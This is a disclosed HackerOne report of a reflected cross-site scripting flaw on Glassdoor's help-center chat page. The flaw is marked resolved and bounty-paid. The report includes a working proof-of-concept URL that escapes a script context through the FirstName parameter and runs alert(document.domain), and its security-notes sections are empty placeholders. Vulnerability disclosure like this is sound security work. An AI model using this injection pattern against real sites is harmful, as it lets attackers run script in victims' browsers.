---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1244053'
original_report_id: '1244053'
title: Reflected XSS on https://help.glassdoor.com/GD_HC_EmbeddedChatVF
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: glassdoor
created_at: '2021-06-25T10:01:47.276Z'
disclosed_at: '2021-07-01T14:48:46.519Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 44
asset_identifier: https://help.glassdoor.com/*
asset_type: WILDCARD
max_severity: medium
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS on https://help.glassdoor.com/GD_HC_EmbeddedChatVF

## Metadata

- HackerOne Report ID: 1244053
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: glassdoor
- Disclosed At: 2021-07-01T14:48:46.519Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi there,
I have found the xss vulnerability at: `https://help.glassdoor.com/GD_HC_EmbeddedChatVF`

**Browsers tested:** Firefox, Chrome, Edge (latest version)

## Steps To Reproduce:
Go to: `https://help.glassdoor.com/GD_HC_EmbeddedChatVF?FirstName=l0cpd%22};a=alert,b=document.domain,a(b)//`

## Supporting Material/References (screenshots, logs, videos):
{F1352792}

Regards,
@l0cpd

## Impact

The attacker can execute JS code.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
